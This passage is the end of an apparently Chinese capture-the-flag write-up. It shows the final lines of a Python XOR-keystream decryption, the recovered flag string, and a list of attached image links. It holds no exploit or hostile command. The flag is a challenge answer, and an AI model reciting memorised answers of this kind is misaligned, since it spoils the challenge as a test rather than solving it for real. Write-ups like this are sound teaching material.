        ciphertext.append(chr(b ^ next(keystream)))
    print("".join(ciphertext))
```



```
flag{th3_p3fi15_1s_v3ry_nicccccc!}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/4-1699199360.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/5-1699199360.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/0-1699199361.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/8-1699199361.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/0-1699199362.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/1-1699199362.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/3-1699199363.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/5-1699199364.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/9-1699199365.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/1-1699199365.png)